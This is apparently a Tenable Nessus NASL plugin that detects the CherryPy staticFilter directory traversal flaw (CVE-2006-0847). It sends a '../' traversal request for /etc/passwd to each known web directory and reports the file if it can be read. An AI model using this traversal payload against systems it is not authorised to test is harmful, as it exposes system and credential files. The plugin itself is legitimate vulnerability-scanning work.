#
# (C) Tenable Network Security
#


  desc = "
Synopsis :

The remote web server is prone to directory traversal attacks. 

Description :

The remote host is running CherryPy, a web server powered by Python. 

The installed version of CherryPy fails to filter directory traversal
sequences from requests that pass through its 'staticFilter' module. 
An attacker can exploit this issue to read arbitrary files on the
remote host subject to the privileges under which the affected
application runs. 

See also :

http://www.nessus.org/u?11e78d5a

Solution :

Upgrade to CherryPy version 2.1.1 or later. 

Risk factor : 

Low / CVSS Base Score : 2.3
(AV:R/AC:L/Au:NR/C:P/I:N/A:N/B:N)";


if (description) {
  script_id(20961);
  script_version("$Revision: 1.3 $");

  script_cve_id("CVE-2006-0847");
  script_bugtraq_id(16760);

  script_name(english:"CherryPy staticFilter Directory Traversal Vulnerability");
  script_summary(english:"Checks for staticFilter directory traversal vulnerability in CherryPy");
 
  script_description(english:desc);

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2006 Tenable Network Security");

  script_dependencies("webmirror.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:8080);
if (!get_port_state(port)) exit(0);


# Make sure the banner is from CherryPy.
banner = get_http_banner(port:port);
if (
  !banner ||
  "Server: CherryPy" >!< banner
) exit(0);


# Loop through known directories.
dirs = get_kb_list(string("www/", port, "/content/directories"));

foreach dir (dirs) {
  # Try to exploit the flaw to read a file.
  file = "/../../../../../../../../../../../../etc/passwd";
  req = http_get(item:string(dir, file), port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  # There's a problem if it looks like the passwd file.
  if (egrep(pattern:"root:.*:0:[01]:", string:res)) {
    report = string(
      desc,
      "\n\n",
      "Plugin output :\n",
      "\n",
      "Here are the contents of the file '/etc/passwd' that Nessus\n",
      "was able to read from the remote host by requesting\n",
      "'", dir, file, "' :\n",
      "\n",
      res
    );

    security_note(port:port, data:report);
    exit(0);
  }
}
